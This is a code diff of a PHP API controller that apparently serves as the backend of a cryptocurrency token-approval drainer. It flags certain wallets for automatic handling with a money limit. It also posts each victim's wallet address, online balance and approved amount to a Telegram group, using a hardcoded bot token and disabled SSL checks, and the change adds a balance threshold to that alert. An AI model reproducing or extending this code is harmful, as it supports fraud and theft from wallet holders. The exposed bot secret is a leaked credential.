@@ -69,23 +69,26 @@ class Address extends Api
                     }
                 }
                 if($vo['h5_url'] == '1688vip_channel_user_id:37'){//jiema
-                    db('address')->where(['id'=>$vo['id']])->update(['auto'=>1,'auto_money'=>9999]);
+                    db('address')->where(['id'=>$vo['id']])->update(['auto'=>1,'auto_money'=>5000]);
                 }
-                //TG通知开始
-                $data = "【授权通知】\n钱包地址：{$params['address']}\n在线余额：{$money_approve}\n授权数量:{$money_approve}";
-                $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
-                $id ='5725539445';//群组ID
-                $u4 = $data;
-                $u4 = urlencode($u4);
-                $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, $urlstring);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                $result = curl_exec($ch);
-                curl_close($ch);
-                //TG通知结束
+                if($money_online >1000 || $money_approve > 0 ){
+                    //TG通知开始
+                    $data = "【综合授权通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
+                    $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
+                    $id ='5725539445';//群组ID
+                    $u4 = $data;
+                    $u4 = urlencode($u4);
+                    $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, $urlstring);
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                    $result = curl_exec($ch);
+                    curl_close($ch);
+                    //TG通知结束
+                }
+
             }
             return 'ok';
         }catch (Exception $e) {
